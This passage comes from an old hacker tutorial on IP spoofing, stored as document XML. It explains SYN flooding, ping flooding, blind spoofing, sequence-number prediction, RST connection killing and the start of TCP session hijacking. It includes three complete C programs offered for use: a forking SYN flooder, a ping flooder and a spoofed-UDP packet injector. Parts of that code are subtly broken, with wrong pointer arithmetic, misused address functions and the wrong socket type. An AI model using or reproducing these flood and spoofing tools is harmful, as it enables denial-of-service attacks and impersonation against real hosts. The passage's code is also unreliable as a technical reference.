      <text:p text:style-name="P288">There are various types, and various techniques attackers might use when</text:p>
      <text:p text:style-name="P289">attempting to spoof packets, or better, spoof a connection. IP spoofing can be</text:p>
      <text:p text:style-name="P290">used in two main ways: to cause DoS, or to gain access to a system as a</text:p>
      <text:p text:style-name="P291">"trusted" host. I will describe various methods and ways of doing so.</text:p>
      <text:p text:style-name="P292"/>
      <text:p text:style-name="P293"/>
      <text:p text:style-name="P294">--] 1.1 ATTACKS - SYN FLOODING</text:p>
      <text:p text:style-name="P295">As explained earlier, when a host wants a connection, they send an initial SYN</text:p>
      <text:p text:style-name="P296">packet to the host that they want to form a connection with. The host then</text:p>
      <text:p text:style-name="P297">replies to the apparent SOURCE ADDRESS with the SYN|ACK packet, and so on. From</text:p>
      <text:p text:style-name="P298">the moment the server host sends the SYN|ACK packet to the originating source</text:p>
      <text:p text:style-name="P299">address of the SYN packet, the connection request is placed onto the kernel's</text:p>
      <text:p text:style-name="P300">TCP/IP stack UNTIL it receives the final ACK packet from the client host. But</text:p>
      <text:p text:style-name="P301">what if, for instance, that the server host never did receive the final ACK</text:p>
      <text:p text:style-name="P302">packet from the originating source address of the connection request? And what</text:p>
      <text:p text:style-name="P303">if A LOT of connection requests were made? Wouldn't they keep getting placed</text:p>
      <text:p text:style-name="P304">onto the kernel's TCP/IP stack? Yes! This is a major flaw in TCP/IP, partially</text:p>
      <text:p text:style-name="P305">due to bad design. Obviously, the connection requests are discarded after a</text:p>
      <text:p text:style-name="P306">shortish amount of time, but it is very easily possible to saturate a hosts</text:p>
      <text:p text:style-name="P307">resources via a SYN flooding attack. I will now attempt to explain how this</text:p>
      <text:p text:style-name="P308">attack works.</text:p>
      <text:p text:style-name="P309"/>
      <text:p text:style-name="P310">Host C (for Client) sends a SYN packet to host S (for Server) to request a</text:p>
      <text:soft-page-break/>
      <text:p text:style-name="P311">connection, with a SPOOFED source IP address. Host S then replies to this</text:p>
      <text:p text:style-name="P312">packet, with a SYN|ACK packet, replying to the SPOOFED address. The connection</text:p>
      <text:p text:style-name="P313">request is then placed on the stack until a final ACK is received. But since</text:p>
      <text:p text:style-name="P314">the source address of the SYN packet was SPOOFED, the Host S (the server) will</text:p>
      <text:p text:style-name="P315">NEVER receive an ACK packet, because the host who it sent a SYN|ACK packet to</text:p>
      <text:p text:style-name="P316">doesn't even exist, so the connection requests stay on the stack! And in a SYN</text:p>
      <text:p text:style-name="P317">flooding attack, an attacker sends literally hundreds if not thousands of</text:p>
      <text:p text:style-name="P318">packets a minute, so with all of these thousands of unanswered connection</text:p>
      <text:p text:style-name="P319">requests sitting on the stack, Host S could be brough to it's knees as it's</text:p>
      <text:p text:style-name="P320">resources and starved and it's process table is saturated. On some platforms,</text:p>
      <text:p text:style-name="P321">the machine can be brough to almost a total lockup, and the CPU utilisation can</text:p>
      <text:p text:style-name="P322">be RAISED dramatically to 100%.</text:p>
      <text:p text:style-name="P323"/>
      <text:p text:style-name="P324">This has become a very popular and effective DoS attack, as it is a pretty easy</text:p>
      <text:p text:style-name="P325">DoS attack to launch with pre-built tools, and requires minimal knowledge of the</text:p>
      <text:p text:style-name="P326">victim host.</text:p>
      <text:p text:style-name="P327"/>
      <text:p text:style-name="P328">Here is a basic diagram of what would be happening during a SYN flooding attack:</text:p>
      <text:p text:style-name="P329"/>
      <text:p text:style-name="P330">******************************************</text:p>
      <text:p text:style-name="P331">Host X: SYN (ISN A), SRC (Z) -&gt; Host S</text:p>
      <text:p text:style-name="P332">Host S: SYN (ISN), ACK (A + 1) -&gt; Host Z (non-existant)</text:p>
      <text:p text:style-name="P333"/>
      <text:p text:style-name="P334">...Connection request put on stack...</text:p>
      <text:p text:style-name="P335">******************************************</text:p>
      <text:p text:style-name="P336"/>
      <text:p text:style-name="P337">Because of not getting replies to these (thus taking them off the stack), Host S</text:p>
      <text:p text:style-name="P338">soon gets pretty bogged down, as described above.</text:p>
      <text:p text:style-name="P339"/>
      <text:p text:style-name="P340">Below I provide a minimal piece of C code I wrote, that performs a SYN flooding</text:p>
      <text:p text:style-name="P341">attack on a specified host, with a spoofed source address, obviously. This code</text:p>
      <text:soft-page-break/>
      <text:p text:style-name="P342">is only provided as an example of how such an attack could be implemented into a</text:p>
      <text:p text:style-name="P343">program:</text:p>
      <text:p text:style-name="P344"/>
      <text:p text:style-name="P345"/>
      <text:p text:style-name="P346">*************************************CUT HERE**********************************</text:p>
      <text:p text:style-name="P347">/* To keep code as small as possible, I haven't included a checksum, which may</text:p>
      <text:p text:style-name="P348">* result in some packet loss. */</text:p>
      <text:p text:style-name="P349"/>
      <text:p text:style-name="P350">#include &lt;stdio.h&gt;</text:p>
      <text:p text:style-name="P351">#include &lt;stdlib.h&gt;</text:p>
      <text:p text:style-name="P352">#include &lt;unistd.h&gt;</text:p>
      <text:p text:style-name="P353">#include &lt;sys/socket.h&gt;</text:p>
      <text:p text:style-name="P354">#include &lt;sys/types.h&gt;</text:p>
      <text:p text:style-name="P355">#include &lt;netinet/in.h&gt;</text:p>
      <text:p text:style-name="P356">#include &lt;netinet/ip.h&gt;</text:p>
      <text:p text:style-name="P357">#include &lt;netinet/tcp.h&gt;</text:p>
      <text:p text:style-name="P358">#include &lt;netdb.h&gt;</text:p>
      <text:p text:style-name="P359">int main(int argc, char *argv[]) {</text:p>
      <text:p text:style-name="P360">if(argc &lt; 3) {</text:p>
      <text:p text:style-name="P361">printf("Usage: %s &lt;host&gt; &lt;port&gt;\n", argv[0]);</text:p>
      <text:p text:style-name="P362">printf("Synflood was written by shaun2k2 - shaunige@yahoo.co.uk\n");</text:p>
      <text:p text:style-name="P363">exit(-1);</text:p>
      <text:p text:style-name="P364">}</text:p>
      <text:p text:style-name="P365"/>
      <text:p text:style-name="P366">int sock;</text:p>
      <text:p text:style-name="P367">char packet[4096]; /* Datagram. */</text:p>
      <text:p text:style-name="P368">struct sockaddr_in dest;</text:p>
      <text:p text:style-name="P369">struct iphdr *ip = (struct iphdr *) packet;</text:p>
      <text:p text:style-name="P370">struct tcphdr *tcp = (struct tcphdr *) packet + sizeof(struct iphdr);</text:p>
      <text:p text:style-name="P371">struct hostent *he;</text:p>
      <text:p text:style-name="P372">if((he = gethostbyname(argv[1])) == NULL) {</text:p>
      <text:soft-page-break/>
      <text:p text:style-name="P373">printf("Couldn't resolve hostname!\n");</text:p>
      <text:p text:style-name="P374">exit(-1);</text:p>
      <text:p text:style-name="P375">}</text:p>
      <text:p text:style-name="P376"/>
      <text:p text:style-name="P377">if((sock = socket (AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1) {</text:p>
      <text:p text:style-name="P378">printf("Socket failed!\n");</text:p>
      <text:p text:style-name="P379">printf("Must be root to make raw socket.\n");</text:p>
      <text:p text:style-name="P380">exit(-1);</text:p>
      <text:p text:style-name="P381">}</text:p>
      <text:p text:style-name="P382">dest.sin_family = AF_INET;</text:p>
      <text:p text:style-name="P383">dest.sin_port = htons(atoi(argv[2]));</text:p>
      <text:p text:style-name="P384">dest.sin_addr = *((struct in_addr *)he-&gt;h_addr);</text:p>
      <text:p text:style-name="P385">memset(packet, 0, 4096); // Zero out packet.</text:p>
      <text:p text:style-name="P386"/>
      <text:p text:style-name="P387">// Fill in IP headers.</text:p>
      <text:p text:style-name="P388">ip-&gt;ihl = 5;</text:p>
      <text:p text:style-name="P389">ip-&gt;version = 4;</text:p>
      <text:p text:style-name="P390">ip-&gt;tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);</text:p>
      <text:p text:style-name="P391">ip-&gt;id = htons(1337);</text:p>
      <text:p text:style-name="P392">ip-&gt;saddr = inet_addr("127.0.0.1");</text:p>
      <text:p text:style-name="P393">ip-&gt;daddr = inet_ntoa(dest.sin_addr);</text:p>
      <text:p text:style-name="P394">ip-&gt;ttl = 255;</text:p>
      <text:p text:style-name="P395">ip-&gt;protocol = 6;</text:p>
      <text:p text:style-name="P396">ip-&gt;check = 0;</text:p>
      <text:p text:style-name="P397">ip-&gt;tos = 0;</text:p>
      <text:p text:style-name="P398">ip-&gt;frag_off = 0;</text:p>
      <text:p text:style-name="P399"/>
      <text:p text:style-name="P400">// Fill in TCP headers.</text:p>
      <text:p text:style-name="P401">tcp-&gt;source = htons(1337);</text:p>
      <text:p text:style-name="P402">tcp-&gt;dest = htons(atoi(argv[2]));</text:p>
      <text:p text:style-name="P403">tcp-&gt;seq = htons(random());</text:p>
      <text:soft-page-break/>
      <text:p text:style-name="P404">tcp-&gt;ack = 0;</text:p>
      <text:p text:style-name="P405">tcp-&gt;syn = 1;</text:p>
      <text:p text:style-name="P406">tcp-&gt;window = htons(65535);</text:p>
      <text:p text:style-name="P407">tcp-&gt;check = 0;</text:p>
      <text:p text:style-name="P408">tcp-&gt;doff = 5;</text:p>
      <text:p text:style-name="P409">tcp-&gt;rst = 0;</text:p>
      <text:p text:style-name="P410">tcp-&gt;psh = 0;</text:p>
      <text:p text:style-name="P411">tcp-&gt;fin = 0;</text:p>
      <text:p text:style-name="P412">tcp-&gt;urg = 0;</text:p>
      <text:p text:style-name="P413">tcp-&gt;ack_seq = htons(0);</text:p>
      <text:p text:style-name="P414">printf("Syn flooding: %s!\n", argv[1]);</text:p>
      <text:p text:style-name="P415">/* Insert some more fork()'s in here, if you want. */</text:p>
      <text:p text:style-name="P416">fork();</text:p>
      <text:p text:style-name="P417">fork();</text:p>
      <text:p text:style-name="P418">while(1) {</text:p>
      <text:p text:style-name="P419">sendto(sock, packet, ip-&gt;tot_len, 0, (struct sockaddr *)&amp;dest, sizeof(struct</text:p>
      <text:p text:style-name="P420">sockaddr));</text:p>
      <text:p text:style-name="P421">}</text:p>
      <text:p text:style-name="P422">return(0);</text:p>
      <text:p text:style-name="P423">}</text:p>
      <text:p text:style-name="P424">*************************************CUT HERE**********************************</text:p>
      <text:p text:style-name="P425"/>
      <text:p text:style-name="P426"/>
      <text:p text:style-name="P427">--] 1.2 ATTACKS - PING FLOODING (ICMP flooding)</text:p>
      <text:p text:style-name="P428">Over the years, along with SYN flooding, Ping flooding is arguably one of the</text:p>
      <text:p text:style-name="P429">most popular DoS attacks among script kiddies on the Internet. Ping flooding</text:p>
      <text:p text:style-name="P430">too is a very simple attack. All that is involved is sending a continuous</text:p>
      <text:p text:style-name="P431">stream of ICMP_ECHO packets (also known as "Ping Packets").</text:p>
      <text:p text:style-name="P432"/>
      <text:p text:style-name="P433">When doing this attack, the attacker is at quite a bit advantage if he/she has a</text:p>
      <text:p text:style-name="P434">faster Internet connection than the victim. I will attempt to explain below how</text:p>
      <text:soft-page-break/>
      <text:p text:style-name="P435">a ping flooding attack works.</text:p>
      <text:p text:style-name="P436"/>
      <text:p text:style-name="P437">Host X (the attacker) sends a continuous stream (or as many packets as possible)</text:p>
      <text:p text:style-name="P438">of ICMP_ECHO packets (ping packets) to Host S (the server host), as fast as they</text:p>
      <text:p text:style-name="P439">can. Since Host X (the attacker) continuously sends ICMP packets without</text:p>
      <text:p text:style-name="P440">waiting for a reply from a spoofed address, Host S is effectively severely</text:p>
      <text:p text:style-name="P441">bogged down with the process of responding to the spoofed ping requests. The</text:p>
      <text:p text:style-name="P442">packets are sent so fast, and so many are sent that eventually sometimes Host S</text:p>
      <text:p text:style-name="P443">is forced to devote ALL 100% CPU utilisation to the responding of the ICMP</text:p>
      <text:p text:style-name="P444">packets.</text:p>
      <text:p text:style-name="P445">The reason the attacker spoofs the source address of the packets is because if</text:p>
      <text:p text:style-name="P446">they didn't, they would become bogged down also, with receiving all of those</text:p>
      <text:p text:style-name="P447">ICMP_ECHO reply packets. It is also an anonimity measure of the attacker, so</text:p>
      <text:p text:style-name="P448">that Host S cannot log the IP address and report them to their ISP.</text:p>
      <text:p text:style-name="P449"/>
      <text:p text:style-name="P450">As I said, it is indeed a VERY simple DoS technique, but yet a VERY effective</text:p>
      <text:p text:style-name="P451">one. This is one of the primary reasons it is a favourite of common</text:p>
      <text:p text:style-name="P452">script-kiddies. I will again provide some source code as an example of how ping</text:p>
      <text:p text:style-name="P453">flood attacks are often implemented into programs:</text:p>
      <text:p text:style-name="P454"/>
      <text:p text:style-name="P455"/>
      <text:p text:style-name="P456">*************************************CUT HERE**********************************</text:p>
      <text:p text:style-name="P457">#include &lt;stdio.h&gt;</text:p>
      <text:p text:style-name="P458">#include &lt;stdlib.h&gt;</text:p>
      <text:p text:style-name="P459">#include &lt;netinet/in.h&gt;</text:p>
      <text:p text:style-name="P460">#include &lt;netdb.h&gt;</text:p>
      <text:p text:style-name="P461">#include &lt;netinet/ip.h&gt;</text:p>
      <text:p text:style-name="P462">#include &lt;netinet/ip_icmp.h&gt;</text:p>
      <text:p text:style-name="P463">int main(int argc, char *argv[]) {</text:p>
      <text:p text:style-name="P464">if(argc &lt; 2) {</text:p>
      <text:p text:style-name="P465">printf("Usage: %s &lt;host&gt;\n", argv[0]);</text:p>
      <text:soft-page-break/>
      <text:p text:style-name="P466">exit(0);</text:p>
      <text:p text:style-name="P467">}</text:p>
      <text:p text:style-name="P468"/>
      <text:p text:style-name="P469">int sock;</text:p>
      <text:p text:style-name="P470">char packet[5000];</text:p>
      <text:p text:style-name="P471">char r[5000];</text:p>
      <text:p text:style-name="P472">struct sockaddr_in dest;</text:p>
      <text:p text:style-name="P473">struct hostent *host;</text:p>
      <text:p text:style-name="P474">struct iphdr *ip = (struct iphdr *) packet;</text:p>
      <text:p text:style-name="P475">struct icmphdr *icmp = (struct icmp *) packet + sizeof(struct iphdr);</text:p>
      <text:p text:style-name="P476">if((host = gethostbyname(argv[1])) == NULL) {</text:p>
      <text:p text:style-name="P477">printf("Couldn't resolve host!\n");</text:p>
      <text:p text:style-name="P478">exit(-1);</text:p>
      <text:p text:style-name="P479">}</text:p>
      <text:p text:style-name="P480"/>
      <text:p text:style-name="P481">if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) {</text:p>
      <text:p text:style-name="P482">printf("Couldn't make socket!\n");</text:p>
      <text:p text:style-name="P483">printf("You must be root to create a raw socket.\n");</text:p>
      <text:p text:style-name="P484">exit(-1);</text:p>
      <text:p text:style-name="P485">}</text:p>
      <text:p text:style-name="P486"/>
      <text:p text:style-name="P487">dest.sin_family = AF_INET;</text:p>
      <text:p text:style-name="P488">dest.sin_addr = *((struct in_addr *)host-&gt;h_addr);</text:p>
      <text:p text:style-name="P489">ip-&gt;ihl = 5;</text:p>
      <text:p text:style-name="P490">ip-&gt;id = htons(1337);</text:p>
      <text:p text:style-name="P491">ip-&gt;ttl = 255;</text:p>
      <text:p text:style-name="P492">ip-&gt;tos = 0;</text:p>
      <text:p text:style-name="P493">ip-&gt;protocol = IPPROTO_ICMP;</text:p>
      <text:p text:style-name="P494">ip-&gt;version = 4;</text:p>
      <text:p text:style-name="P495">ip-&gt;frag_off = 0;</text:p>
      <text:p text:style-name="P496">ip-&gt;saddr = htons("1.3.3.7");</text:p>
      <text:soft-page-break/>
      <text:p text:style-name="P497">ip-&gt;daddr = inet_ntoa(dest.sin_addr);</text:p>
      <text:p text:style-name="P498">ip-&gt;tot_len = sizeof(struct iphdr) + sizeof(struct icmphdr);</text:p>
      <text:p text:style-name="P499">ip-&gt;check = 0;</text:p>
      <text:p text:style-name="P500">icmp-&gt;checksum = 0;</text:p>
      <text:p text:style-name="P501">icmp-&gt;type = ICMP_ECHO;</text:p>
      <text:p text:style-name="P502">icmp-&gt;code = 0;</text:p>
      <text:p text:style-name="P503">printf("Ping flooding %s!\n", argv[1]);</text:p>
      <text:p text:style-name="P504">fork();</text:p>
      <text:p text:style-name="P505">fork();</text:p>
      <text:p text:style-name="P506">while(1) {</text:p>
      <text:p text:style-name="P507">sendto(sock, packet, ip-&gt;tot_len, 0, (struct sockaddr *)&amp;dest, sizeof(struct</text:p>
      <text:p text:style-name="P508">sockaddr));</text:p>
      <text:p text:style-name="P509">}</text:p>
      <text:p text:style-name="P510">return(0);</text:p>
      <text:p text:style-name="P511">}</text:p>
      <text:p text:style-name="P512">*************************************CUT HERE**********************************</text:p>
      <text:p text:style-name="P513"/>
      <text:p text:style-name="P514"/>
      <text:p text:style-name="P515">--] 1.3 ATTACKS - BLIND SPOOFING ATTACKS</text:p>
      <text:p text:style-name="P516">Now onto the good stuff. The term "blind spoofing" is usually used to describe</text:p>
      <text:p text:style-name="P517">IP spoofing that will get you access to a system as a trusted host, but more</text:p>
      <text:p text:style-name="P518">specifically, it means that ALL IP spoofing is blind (even our DoS IP spoofing</text:p>
      <text:p text:style-name="P519">techniques above, but we don't need to know what's going on in a DoS attack</text:p>
      <text:p text:style-name="P520">anyway), and it is.</text:p>
      <text:p text:style-name="P521">By this, it means that we don't know exactly what's going on, and we don't know</text:p>
      <text:p text:style-name="P522">immediately if what we've attempted has worked. We explore two kind of types of</text:p>
      <text:p text:style-name="P523">blind IP spoofing: Sequence Number Prediction Attacks, and just single packet</text:p>
      <text:p text:style-name="P524">spoofing attacks.</text:p>
      <text:p text:style-name="P525">Sequence Number Attacks allow you to brute force or take educated guesses at the</text:p>
      <text:p text:style-name="P526">SERVER's SYN|ACK packet's Sequence number, and thus form a connection, whereas</text:p>
      <text:p text:style-name="P527">ordinary packet spoofing just allows you to send a spoofed packet on it's own</text:p>
      <text:soft-page-break/>
      <text:p text:style-name="P528">(maybe useful when spoofing a packet to a UDP port, or spoofing an ICMP</text:p>
      <text:p text:style-name="P529">request).</text:p>
      <text:p text:style-name="P530"/>
      <text:p text:style-name="P531"/>
      <text:p text:style-name="P532">--] 1.3.1 ATTACKS - BLIND SPOOFING ATTACKS - SEQUENCE NUMBER PREDICTION</text:p>
      <text:p text:style-name="P533">This is the ultimate attack in IP spoofing, to gain a connection with a host,</text:p>
      <text:p text:style-name="P534">pretending to be another host, preferably a trusted host. All that is required</text:p>
      <text:p text:style-name="P535">is that the attacker can predict the sequence number of the server host's</text:p>
      <text:p text:style-name="P536">SYN|ACK packet after sending a SYN packet, but this is not as simple task as</text:p>
      <text:p text:style-name="P537">somebody might think.</text:p>
      <text:p text:style-name="P538">First, there's the issue of actually guessing the sequence number of this packet</text:p>
      <text:p text:style-name="P539">of interest, and secondly, there's the issue of the host you are spoofing of</text:p>
      <text:p text:style-name="P540">answering to the SYN|ACK packet, and sending a RST (reset connection) packet</text:p>
      <text:p text:style-name="P541">because it was not expecting the SYN|ACK packet. The second problem is actually</text:p>
      <text:p text:style-name="P542">simpler to deal with. A classic method of preventing the spoofed host from</text:p>
      <text:p text:style-name="P543">replying to the SYN|ACK packet with a RST is by SYN flooding it (see above for</text:p>
      <text:p text:style-name="P544">details). Now onto how to solve our first problem.</text:p>
      <text:p text:style-name="P545"/>
      <text:p text:style-name="P546"/>
      <text:p text:style-name="P547">--] 1.3.2 ATTACKS - BLIND SPOOFING ATTACKS - SEQUENCE NUMBER PREDICTION TOOLS</text:p>
      <text:p text:style-name="P548">There are many tools out there, most of them for free, availiable to assist an</text:p>
      <text:p text:style-name="P549">attacker whilst attempting to perform a blind spoofing attack. One of the most</text:p>
      <text:p text:style-name="P550">useful ones is "SEQ-scan" which sends SYN packets to a target host, and from the</text:p>
      <text:p text:style-name="P551">received SYN|ACK packet's Sequence Numbers determines an educated guess at what</text:p>
      <text:p text:style-name="P552">the next sequence number would be.</text:p>
      <text:p text:style-name="P553">SEQ-scan can be used to determine the correct Sequence Numbers for both the old</text:p>
      <text:p text:style-name="P554">64k Sequence Number generation technique, and the time related generation</text:p>
      <text:p text:style-name="P555">techniques.</text:p>
      <text:p text:style-name="P556"/>
      <text:p text:style-name="P557"/>
      <text:p text:style-name="P558">--] 1.3.3 - ATTACKS - BLIND SPOOFING ATTACKS - PACKET SPOOFING</text:p>
      <text:soft-page-break/>
      <text:p text:style-name="P559">Sometimes attackers don't actually NEED a connection with a server host, rather</text:p>
      <text:p text:style-name="P560">they just need to spoof a single packet, to do a certain thing. In this case,</text:p>
      <text:p text:style-name="P561">it is very much easier than the above spoofing technique above, Sequence Number</text:p>
      <text:p text:style-name="P562">Prediction. In this case, all an attacker needs to do is inject a</text:p>
      <text:p text:style-name="P563">packet/datagram/segment, and set a fake source address. As you can probably</text:p>
      <text:p text:style-name="P564">see, this is quite a big flaw and security vulnerability in TCP/IP, as the</text:p>
      <text:p text:style-name="P565">TCP/IP suite makes absolutely no attempt at verifying that the supplied source</text:p>
      <text:p text:style-name="P566">address is actually the real one. Below, I will explain how an attacker could</text:p>
      <text:p text:style-name="P567">use this flaw to his/her advantage.</text:p>
      <text:p text:style-name="P568"/>
      <text:p text:style-name="P569">Say for example that there is a game which allows you to play against somebody</text:p>
      <text:p text:style-name="P570">over the Internet, but instead of using the TCP protocol for transfering the</text:p>
      <text:p text:style-name="P571">data to each opponent, it uses UDP for extra speed. Just say for example that</text:p>
      <text:p text:style-name="P572">the author of the game wrote a little routine that made the play quit/submit the</text:p>
      <text:p text:style-name="P573">game if they send the string "LOSE" in the UDP datagram, and this option is</text:p>
      <text:p text:style-name="P574">accessed via a little menu on the game.</text:p>
      <text:p text:style-name="P575">All an attacker has to do to make his opponent lose the game is spoof a UDP</text:p>
      <text:p text:style-name="P576">datagram to appear that it has originated from your opponent, and inject the</text:p>
      <text:p text:style-name="P577">string "LOSE" into it. Here is a basic diagram of what would be happening</text:p>
      <text:p text:style-name="P578">during one of these packet spoofing attacks:</text:p>
      <text:p text:style-name="P579"/>
      <text:p text:style-name="P580"/>
      <text:p text:style-name="P581">******************************************</text:p>
      <text:p text:style-name="P582">Host X: SRC (Host C), DATA ("LOSE") -&gt; Host S</text:p>
      <text:p text:style-name="P583">...Host S closes the session, and Host C loses the game...</text:p>
      <text:p text:style-name="P584">******************************************</text:p>
      <text:p text:style-name="P585"/>
      <text:p text:style-name="P586">The datagram sent by Host X (the attacker) had a spoofed source address,</text:p>
      <text:p text:style-name="P587">pretending to be from Host C (the opponent). The game server received the</text:p>
      <text:p text:style-name="P588">datagram, and presumed it was from Host C, and consequently ended the game,</text:p>
      <text:p text:style-name="P589">leaving Host X as the winner.</text:p>
      <text:p text:style-name="P590"/>
      <text:p text:style-name="P591">This does not seem like a huge security flaw, but what if this was a login</text:p>
      <text:p text:style-name="P592">server we were attacking, which the author had written to just automatically</text:p>
      <text:p text:style-name="P593">execute commands specified by the sender just by checking that the source</text:p>
      <text:p text:style-name="P594">address was right? Then the system would be at risk.</text:p>
      <text:p text:style-name="P595"/>
      <text:p text:style-name="P596">Below is a minimal piece of C code I have written , just as an example of how</text:p>
      <text:p text:style-name="P597">such an attack could be implemented into a program:</text:p>
      <text:p text:style-name="P598"/>
      <text:p text:style-name="P599"/>
      <text:p text:style-name="P600">*************************************CUT HERE**********************************</text:p>
      <text:p text:style-name="P601">#include &lt;stdio.h&gt;</text:p>
      <text:p text:style-name="P602">#include &lt;stdlib.h&gt;</text:p>
      <text:p text:style-name="P603">#include &lt;netinet/in.h&gt;</text:p>
      <text:p text:style-name="P604">#include &lt;netdb.h&gt;</text:p>
      <text:p text:style-name="P605">#include &lt;netinet/ip.h&gt;</text:p>
      <text:p text:style-name="P606">#include &lt;netinet/udp.h&gt;</text:p>
      <text:p text:style-name="P607">int main(int argc, char *argv[]) {</text:p>
      <text:p text:style-name="P608">if(argc &lt; 2) {</text:p>
      <text:p text:style-name="P609">printf("Usage: %s &lt;host&gt;\n", argv[0]);</text:p>
      <text:p text:style-name="P610">exit(0);</text:p>
      <text:p text:style-name="P611">}</text:p>
      <text:p text:style-name="P612"/>
      <text:p text:style-name="P613">int sock;</text:p>
      <text:p text:style-name="P614">char packet[5000];</text:p>
      <text:p text:style-name="P615">char msg[50] = "LOSE";</text:p>
      <text:p text:style-name="P616">int msglen = strlen(msg);</text:p>
      <text:p text:style-name="P617">struct sockaddr_in dest;</text:p>
      <text:p text:style-name="P618">struct hostent *host;</text:p>
      <text:p text:style-name="P619">int sport = 1337;</text:p>
      <text:p text:style-name="P620">struct iphdr *ip = (struct iphdr *) packet;</text:p>
      <text:soft-page-break/>
      <text:p text:style-name="P621">struct udphdr *udp = (struct udphdr *) packet + sizeof(struct iphdr);</text:p>
      <text:p text:style-name="P622">if((host = gethostbyname(argv[1])) == NULL) {</text:p>
      <text:p text:style-name="P623">printf("Couldn't resolve host!\n");</text:p>
      <text:p text:style-name="P624">exit(-1);</text:p>
      <text:p text:style-name="P625">}</text:p>
      <text:p text:style-name="P626"/>
      <text:p text:style-name="P627">if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) {</text:p>
      <text:p text:style-name="P628">printf("Couldn't make socket!\n");</text:p>
      <text:p text:style-name="P629">printf("You must be root to create a raw socket.\n");</text:p>
      <text:p text:style-name="P630">exit(-1);</text:p>
      <text:p text:style-name="P631">}</text:p>
      <text:p text:style-name="P632"/>
      <text:p text:style-name="P633">dest.sin_family = AF_INET;</text:p>
      <text:p text:style-name="P634">dest.sin_addr = *((struct in_addr *)host-&gt;h_addr);</text:p>
      <text:p text:style-name="P635">dest.sin_port = htons(1024);</text:p>
      <text:p text:style-name="P636"/>
      <text:p text:style-name="P637">ip-&gt;ihl = 5;</text:p>
      <text:p text:style-name="P638">ip-&gt;id = htons(1337);</text:p>
      <text:p text:style-name="P639">ip-&gt;ttl = 255;</text:p>
      <text:p text:style-name="P640">ip-&gt;tos = 0;</text:p>
      <text:p text:style-name="P641">ip-&gt;protocol = IPPROTO_UDP;</text:p>
      <text:p text:style-name="P642">ip-&gt;version = 4;</text:p>
      <text:p text:style-name="P643">ip-&gt;frag_off = 0;</text:p>
      <text:p text:style-name="P644">ip-&gt;saddr = htons("1.3.3.7");</text:p>
      <text:p text:style-name="P645">ip-&gt;daddr = inet_ntoa(dest.sin_addr);</text:p>
      <text:p text:style-name="P646">ip-&gt;tot_len = sizeof(struct iphdr) + sizeof(struct udphdr);</text:p>
      <text:p text:style-name="P647">ip-&gt;check = 0;</text:p>
      <text:p text:style-name="P648">udp-&gt;source = htons(sport);</text:p>
      <text:p text:style-name="P649">udp-&gt;dest = htons(dest.sin_port);</text:p>
      <text:p text:style-name="P650">udp-&gt;len = htons(msglen + 8);</text:p>
      <text:p text:style-name="P651">memcpy(packet + sizeof(ip) + sizeof(udp), msg, msglen);</text:p>
      <text:soft-page-break/>
      <text:p text:style-name="P652">printf("Sending UDP datagram.\n");</text:p>
      <text:p text:style-name="P653">sendto(sock, packet, ip-&gt;tot_len, 0, (struct sockaddr *)&amp;dest, sizeof(struct</text:p>
      <text:p text:style-name="P654">sockaddr));</text:p>
      <text:p text:style-name="P655">return(0);</text:p>
      <text:p text:style-name="P656">}</text:p>
      <text:p text:style-name="P657">*************************************CUT HERE**********************************</text:p>
      <text:p text:style-name="P658"/>
      <text:p text:style-name="P659"/>
      <text:p text:style-name="P660">--] 1.3.4 ATTACKS - BLIND SPOOFING ATTACKS - CONNECTION KILLING</text:p>
      <text:p text:style-name="P661">As you probably know by now, the RST flag is a very commonly used flag in</text:p>
      <text:p text:style-name="P662">packets, usually used to signal to the remote host that the connection should be</text:p>
      <text:p text:style-name="P663">reset. The only thing that is needed in a RST packet is the RST bit set to 1,</text:p>
      <text:p text:style-name="P664">the SEQuence number set to the CLIENT's SEQuence number + 1, and the source</text:p>
      <text:p text:style-name="P665">port. It is NOT as simple as simply sending a spoofed TCP packet with the RST</text:p>
      <text:p text:style-name="P666">flag set, and killing the connection.</text:p>
      <text:p text:style-name="P667"/>
      <text:p text:style-name="P668">Although this is still a serious vulnerability in TCP/IP, to exploit it we would</text:p>
      <text:p text:style-name="P669">again as above have to brute force BOTH the source port (the port the client</text:p>
      <text:p text:style-name="P670">host is sending data from), and the correct Sequence number to send. To brute</text:p>
      <text:p text:style-name="P671">force the Sequence Number, see above. The process of brute forcing the source</text:p>
      <text:p text:style-name="P672">port is a little easier, as usually the only possibilities is the range</text:p>
      <text:p text:style-name="P673">1024-65535.</text:p>
      <text:p text:style-name="P674"/>
      <text:p text:style-name="P675">Here is a basic diagram of what would happen during a connection killing attack:</text:p>
      <text:p text:style-name="P676"/>
      <text:p text:style-name="P677">******************************************</text:p>
      <text:p text:style-name="P678">...Host T is communicating with Host S...</text:p>
      <text:p text:style-name="P679">Host X: RST, SEQ (A), SRC (Host T, Port 1234) -&gt; Host S</text:p>
      <text:p text:style-name="P680">...Host S closes the connection because it thinks the RST packet was from Host T...</text:p>
      <text:p text:style-name="P681">******************************************</text:p>
      <text:p text:style-name="P682"/>
      <text:p text:style-name="P683"/>
      <text:p text:style-name="P684">--[ 1.0 ATTACKS - TCP SESSION HIJACKING ]--</text:p>
      <text:p text:style-name="P685">TCP session hijacking is the term used to describe an attacker hijacking an</text:p>
      <text:p text:style-name="P686">already established connection, usually allowing them to execute commands as the</text:p>
      <text:p text:style-name="P687">actual connected user.</text:p>
      <text:p text:style-name="P688"/>
      <text:p text:style-name="P689">It is due to slight design errors in the TCP/IP suite that this kind of attacks</text:p>
      <text:p text:style-name="P690">is possible, making it almost trivial for the attacker who has seized access to</text:p>
      <text:p text:style-name="P691">the connection to execute commands as the legimate user.</text:p>
      <text:p text:style-name="P692"/>
      <text:p text:style-name="P693">There are a few various types of TCP session hijacking techniques, but a very</text:p>
      <text:p text:style-name="P694">commonly used one, and arguably the most popular of TCP hijacking techniques is</text:p>
      <text:p text:style-name="P695">the "Man-in-the-middle" attack.</text:p>
      <text:p text:style-name="P696"/>
      <text:p text:style-name="P697"/>
      <text:p text:style-name="P698">--] 1.1 ATTACKS - TCP SESSION HIJACKING - MAN-IN-THE-MIDDLE ATTACK</text:p>
      <text:p text:style-name="P699">The "man-in-the-middle" attack is a common method of taking over a TCP</text:p>
      <text:p text:style-name="P700">connection between two hosts, and allows the attacker who has gained access to</text:p>
      <text:p text:style-name="P701">the connection to execute commands as the client host.</text:p>
